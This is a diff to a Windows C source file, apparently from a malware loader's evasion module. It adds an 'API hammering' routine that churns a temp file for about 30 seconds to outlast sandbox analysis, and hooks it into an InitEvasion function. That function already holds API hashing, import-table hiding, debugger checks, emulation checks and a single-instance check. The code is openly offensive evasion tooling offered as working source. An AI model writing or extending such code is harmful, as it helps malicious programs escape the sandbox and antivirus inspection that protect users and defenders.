@@ -3,6 +3,9 @@
 
 //Pseudo handle
 #define NtCurrentProcess() ((HANDLE)-1)
+//API Hammering temporary file
+#define TMPFILE L"D34DD34D.tmp"
+#define CYCLES ((DWORD)5000) //30 sec on R7 3700X
 
 //API Hashing using Djb2 for ANSI and Unicode
 DWORD HashStringDjb2A(PCHAR String)
@@ -113,8 +116,66 @@ int CheckExecControl() {
 	return (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) ? -5 : 0;
 }
 
+int APIHammering(DWORD dwStress) {
+	WCHAR szPath[MAX_PATH * 2], szTmpPath[MAX_PATH];
+	DWORD dwNumOfBytesRead = NULL, dwNumOfBytesWritten = NULL;
+	PBYTE pRandBuff = NULL;
+	SIZE_T sBuffSize = 0xFFFFF; // 1048575 bytes size
+	INT Rand = 0;
+
+	HANDLE hReadFile = INVALID_HANDLE_VALUE;
+	HANDLE hWriteFile = INVALID_HANDLE_VALUE;
+
+	// Get tmp folder path
+	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
+		return -6;
+	}
+
+	// construct file path
+	wsprintfW(szPath, L"%s%s", szTmpPath, TMPFILE);
+
+	for (SIZE_T i = 0; i < dwStress; i++) {
+		// Create file in write mode
+		if ((hWriteFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
+			return -7;
+		}
+
+		// allocate buffer and fill it with random data
+		pRandBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
+		srand(time(NULL));
+		Rand = rand() % 0xFF;
+		memset(pRandBuff, Rand, sBuffSize);
+
+		// write random data into file
+		if (!WriteFile(hWriteFile, pRandBuff, sBuffSize, &dwNumOfBytesWritten, NULL) || dwNumOfBytesWritten != sBuffSize) {
+			return -8;
+		}
+
+		// clear the buffer
+		RtlZeroMemory(pRandBuff, sBuffSize);
+		CloseHandle(hWriteFile);
+
+		// opne file in read mode and delete when it is done
+		if ((hReadFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
+			return -9;
+		}
+
+		// read the random data from the file
+		if (!ReadFile(hReadFile, pRandBuff, sBuffSize, &dwNumOfBytesRead, NULL) || dwNumOfBytesRead != sBuffSize) {
+			return -10;
+		}
+
+		// clean up
+		RtlZeroMemory(pRandBuff, sBuffSize);
+		HeapFree(GetProcessHeap(), NULL, pRandBuff);
+		CloseHandle(hReadFile);
+	}
+	// all ok
+	return 0;
+}
+
 //IAT Hiding - functions
-void InitEvasion() {
+int InitEvasion() {
 	fnVirtualAllocExNuma pVirtualAllocExNuma;
 	fnFlsAlloc pFlsAlloc;
 	fnIsDebuggerPresent pIsDebuggerPresent;
@@ -128,4 +189,6 @@ void InitEvasion() {
 	if (CheckApiEmulation1(pFlsAlloc) < 0) return -3;
 	if (CheckApiEmulation2(pVirtualAllocExNuma) < 0) return -4;
 	if (CheckExecControl() < 0) return -5;
+	// 5000 cycles - all depends on hardware specs
+	if (APIHammering(CYCLES) != 0) return -6;
 }
